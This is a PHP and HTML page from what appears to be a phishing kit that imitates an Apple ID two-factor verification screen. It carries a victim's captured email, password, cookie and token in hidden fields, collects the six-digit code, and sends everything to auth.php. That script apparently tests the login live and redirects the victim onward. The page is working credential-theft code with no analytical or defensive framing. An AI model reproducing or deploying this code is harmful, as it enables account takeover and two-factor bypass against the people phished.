<?php
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/simplehtmldom.php";
require "includes/bahasa.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
  var charLimit = 1;
  $(".form-textbox").keyup (function () {
    if (this.value.length >= charLimit) {
        $(this).next('.form-textbox').focus();
        return false;
    }
  });
  var fields = $('#digit1, #digit2, #digit3, #digit4, #digit5, #digit6');
  fields.bind('keyup', function() {
    var digit  = ""+$('#digit1').val() + $('#digit2').val() + $('#digit3').val() + $('#digit4').val() + $('#digit5').val() + $('#digit6').val();
    digit.trim();
    var akali=digit.length;
    //alert(digit);
    //if (allFilled(fields)) {
     // alert(digit.length)
      if(akali==6){
       send($('#mail').val(), $('#pass').val(), $('#cook').val(), $('#ctkn').val(), digit);
      }
    //}
  });
});
function allFilled(fields) {
  return fields.filter(function() {
    return this.value === ''; 
  }).length == 0;
}
function send(email, pass, cook, ctkn, digit) {
  $.ajax({
    url: "auth.php",
    type: "POST",
    data: {
      email: email,
      pass: pass,
      cook: cook,
      ctkn: ctkn,
      digit: digit
    },
    dataType: "json",
    success: function(result) {
      switch (result.status) {
        case 'live':
        window.location.replace("locked.php");
        break;
        case 'die':
        window.location.replace("2auth.php");
        break;
      }
    },
    error: function(xhr, ajaxOptions, thrownError) {
      //alert(xhr.status);
      //alert(thrownError);
    }

  });
      return false;
}
</script>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="HoldLoginDiv">
<div class="logo"><img style="width: 200px;" class="TextLogo" src="img/logo.png"></div>
<div>
<div id="stepEl" class="  "><hsa2 suppress-iforgot="{suppressIforgot}">
<div class="hsa2">
<div class="verify-device fade-in">
<div class="">
<h1 class="LoginTitkle"><?php echo $bhs['2auth1']; ?></h1>
<div class="sec-code-wrapper">
<security-code>
<div id="security-code-wrap-1500271854620-0" class="security-code-wrap security-code-6 " localiseddigit="Digit">
<div class="security-code-container force-ltr">
<div class="field-wrap force-ltr">
<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit1" class="form-control force-ltr form-textbox char-field" placeholder="">

<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit2" class="form-control force-ltr form-textbox char-field" placeholder="">

<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit3" class="form-control force-ltr form-textbox char-field" placeholder="">
&nbsp;&nbsp;&nbsp;
<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit4" class="form-control force-ltr form-textbox char-field" placeholder="">

<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit5" class="form-control force-ltr form-textbox char-field" placeholder="">

<input maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="digit6" class="form-control force-ltr form-textbox char-field" placeholder="">
<input type="hidden" id="mail" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" id="pass" value="<?php echo $_SESSION['pass'];?>">
<input type="hidden" id="cook" value="<?php echo $_SESSION['cook'];?>">
<input type="hidden" id="ctkn" value="<?php echo $_SESSION['ctkn'];?>">
</div>
</div>
  <label class="sr-only" id="idms-input-error-1500271854620-0"></label>
</div>
</security-code>
</div>
<div class="si-info">
<p><?php echo $bhs['2auth2']; ?></p>
</div>
<a id="no-trstd-device-pop" href="#" aria-haspopup="true" class="si-link  ax-outline tk-subbody lite-theme-override"><?php echo $bhs['2auth3']; ?></a>
<div class="spinner-container verifying-code" id="verifying-code"></div>
</div>
</div>
</div>
</hsa2></div>
</div>
</div>
</div>
</div>
</body>
</html>